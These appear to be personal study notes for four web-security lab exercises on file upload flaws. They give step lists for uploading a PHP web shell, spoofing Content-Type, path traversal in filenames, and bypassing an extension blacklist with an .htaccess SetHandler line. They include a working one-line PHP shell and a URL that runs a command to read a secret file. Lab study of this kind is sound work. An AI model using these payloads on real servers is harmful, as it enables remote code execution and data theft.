#1 Lab:Remote code execution via web shell upload

    1.Upload normal image and see the response.
    2.Upload a web shell and see the response.
    3. Upload web shell with .php or .php.png extension and see the response.
    4. Access the uploaded web shell via browser and execute commands. using /files/avatars/image.php

---------------------------------------------------------------------------------------------------

When submitting HTML forms, the browser typically sends the provided data in a POST request with the content type application/x-www-form-urlencoded. 
This is fine for sending simple text like your name or address. However, it isn't suitable for sending large amounts of binary data, such as an entire image file or a PDF document. 
In this case, the content type multipart/form-data is preferred. 

----------------------------------------------------------------------------------------------------

#2 Lab: Web shell upload via Content-Type restriction bypass

    1.Upload php shell and turn on the intercepting proxy.
    2.Change the Content-Type from application/x-php to image/jpeg
    3. Forward the request and see the response.
    4. Access the uploaded web shell via browser and execute commands. using /files/avatars/image.php

----------------------------------------------------------------------------------------------------

IMP:- Web servers often use the filename field in multipart/form-data requests to determine the name and location where the file should be saved. 

#3 Lab: Web shell upload via path traversal

    1.change filename from ex.php to ..%2fex.php in the intercepted request.
    2.Forward the request and see the response.
    3. Turn off intercept nd inspec on image>open image in new tab
    4. Change the path of image to files/ex.php

----------------------------------------------------------------------------------------------------

IF php extension is blocked, we can try other extensions like .php5, .shtml, .phtml etc.

#4 Lab: Web shell upload via extension blacklist bypass

    1. Upload a normal image and see the response.
    2. Look for my-account/avatar and send to repeater, files/avatars/image.jpg send to repeater 
    3  In files/avatars/image.jpg remove the bifurcated data and in my-account/avatar write php shell code, <?php system($_GET['evil']); and snd the request
    4. See the Apache veersion and its vulnerable and in /my-account/avatar change filename to ".htaaccess" nd remove the php payload from it .
    5. Add SetHandler application/x-httpd-php instead of payload and send the request.
    6. Access the uploaded web shell via browser and execute commands. using /files/avatars/image.jpg?evil=cat+/home/carlos/secret


-------------------------------------------------------------------------------------------------------